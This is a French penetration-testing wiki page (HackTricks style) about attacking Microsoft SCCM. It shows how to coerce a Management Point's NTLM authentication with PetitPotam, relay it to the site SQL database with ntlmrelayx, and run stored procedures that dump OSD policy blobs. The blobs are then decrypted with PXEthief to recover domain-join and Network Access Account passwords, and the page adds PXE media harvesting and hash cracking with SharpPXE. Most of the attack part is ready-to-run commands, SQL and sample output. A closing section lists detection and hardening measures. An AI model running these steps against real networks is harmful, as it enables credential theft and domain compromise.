# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
En forçant un **System Center Configuration Manager (SCCM) Management Point (MP)** à s'authentifier via SMB/RPC et en **relayant** ensuite ce compte machine NTLM vers la **site database (MSSQL)**, vous obtenez les droits `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Ces rôles permettent d'appeler un ensemble de procédures stockées qui exposent les blobs de stratégie **Operating System Deployment (OSD)** (identifiants du Network Access Account, variables de Task-Sequence, etc.). Les blobs sont encodés/chiffrés en hexadécimal, mais peuvent être décodés et déchiffrés avec **PXEthief**, ce qui permet d'obtenir les secrets en clair.

Chaîne de haut niveau :
1. Découvrir le MP et la site DB ↦ endpoint HTTP non authentifié `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Démarrer `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Forcer l'authentification du MP avec **PetitPotam**, PrinterBug, DFSCoerce, etc.
4. Via le proxy SOCKS, se connecter avec `mssqlclient.py -windows-auth` en tant que compte **<DOMAIN>\\<MP-host>$** relayé.
5. Exécuter :
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (ou `MP_GetPolicyBodyAfterAuthorization`)
6. Supprimer le BOM `0xFFFE`, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Des secrets tels que `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, etc. sont récupérés sans accéder à PXE ni aux clients.<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Énumération des endpoints MP non authentifiés
L'extension ISAPI **GetAuth.dll** du MP expose plusieurs paramètres qui ne nécessitent pas d'authentification (sauf si le site est limité à PKI) :<sup>[[1]](#references)</sup>

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Retourne la clé publique du certificat de signature du site ainsi que les GUID des appareils *x86* / *x64* **All Unknown Computers**. |
| `MPLIST` | Liste tous les Management-Point du site. |
| `SITESIGNCERT` | Retourne le certificat de signature du Primary-Site (permet d'identifier le site server sans LDAP). |

Récupérer les GUID qui serviront de **clientID** pour les requêtes DB ultérieures :
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Relay le compte machine du MP vers MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Lorsque la coercition se déclenche, vous devriez voir quelque chose comme :
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identifier les politiques OSD via des procédures stockées
Connectez-vous via le proxy SOCKS (port 1080 par défaut) :<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Basculer vers la base de données **CM_<SiteCode>** (utilisez le code de site à 3 chiffres, par exemple `CM_001`).

### 3.1  Trouver les GUID des Unknown-Computer (facultatif)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Lister les stratégies attribuées
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Chaque ligne contient `PolicyAssignmentID`, `Body` (hexadécimal), `PolicyID` et `PolicyVersion`.

Concentrez-vous sur les policies suivantes :
* **NAAConfig** – identifiants du Network Access Account
* **TS_Sequence** – variables de Task Sequence (OSDJoinAccount/Password)
* **CollectionSettings** – peut contenir des comptes run-as

### 3.3 Récupérer le body complet
Si vous avez déjà `PolicyID` et `PolicyVersion`, vous pouvez ignorer l’exigence du clientID en utilisant :
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> IMPORTANT : Dans SSMS, augmentez « Maximum Characters Retrieved » (>65535), sinon le blob sera tronqué.

---

## 4. Décoder et déchiffrer le blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Exemple de secrets récupérés :
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Rôles et procédures SQL pertinents
Lors du relay, le login est mappé vers :<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Ces rôles exposent des dizaines d’autorisations EXEC ; les principales utilisées dans cette attaque sont :

| Stored Procedure | Purpose |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Lister les policies appliquées à un `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Retourner le contenu complet de la policy. |
| `MP_GetListOfMPsInSiteOSD` | Renvoyée par le chemin `MPKEYINFORMATIONMEDIA`. |

Vous pouvez inspecter la liste complète avec :
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Collecte de supports de démarrage PXE (SharpPXE)
* **Réponse PXE sur UDP/4011** : envoyer une requête de démarrage PXE à un Distribution Point configuré pour PXE. La réponse proxyDHCP révèle des chemins de démarrage tels que `SMSBoot\\x64\\pxe\\variables.dat` (configuration chiffrée) et `SMSBoot\\x64\\pxe\\boot.bcd`, ainsi qu’un blob de clé chiffré facultatif.<sup>[[4]](#references)</sup>
* **Récupérer les artefacts de démarrage via TFTP** : utiliser les chemins renvoyés pour télécharger `variables.dat` via TFTP (sans authentification). Le fichier est petit (quelques Ko) et contient les variables de média chiffrées.
* **Déchiffrer ou cracker** :
- Si la réponse inclut la clé de déchiffrement, la fournir à **SharpPXE** pour déchiffrer directement `variables.dat`.
- Si aucune clé n’est fournie (média PXE protégé par un mot de passe personnalisé), SharpPXE génère un hash compatible avec **Hashcat**, au format `$sccm$aes128$...`, pour un cracking offline. Après récupération du mot de passe, déchiffrer le fichier.
* **Analyser le XML déchiffré** : les variables en clair contiennent les métadonnées du déploiement SCCM (**URL du Management Point**, **Site Code**, GUID de média et autres identifiants). SharpPXE les analyse et affiche une commande **SharpSCCM** prête à l’emploi, avec les paramètres GUID/PFX/site préremplis pour la suite de l’abus.
* **Prérequis** : uniquement une connectivité réseau vers le listener PXE (UDP/4011) et TFTP ; aucun privilège d’administrateur local n’est nécessaire.

---

## 7. Détection et durcissement
1. **Surveiller les logins du MP** – tout compte d’ordinateur MP qui se connecte depuis une IP qui n’est pas celle de son hôte indique ≈ un relay.<sup>[[1]](#references)</sup>
2. Activer **Extended Protection for Authentication (EPA)** sur la base de données du site (`PREVENT-14`).
3. Désactiver NTLM inutilisé, imposer la signature SMB et restreindre RPC (mêmes mitigations que celles utilisées contre `PetitPotam`/`PrinterBug`).
4. Renforcer les communications MP ↔ DB avec IPSec / mutual-TLS.
5. **Limiter l’exposition PXE** – filtrer UDP/4011 et TFTP par pare-feu vers les VLAN de confiance, exiger des mots de passe PXE et déclencher une alerte lors des téléchargements TFTP de `SMSBoot\\*\\pxe\\variables.dat`.<sup>[[4]](#references)</sup>

---

## Voir aussi
* Fondamentaux du NTLM relay :

{{#ref}}
../ntlm/README.md
{{#endref}}

* Abus MSSQL et post-exploitation :

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

## Références
- [1] [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)

{{#include ../../banners/hacktricks-training.md}}
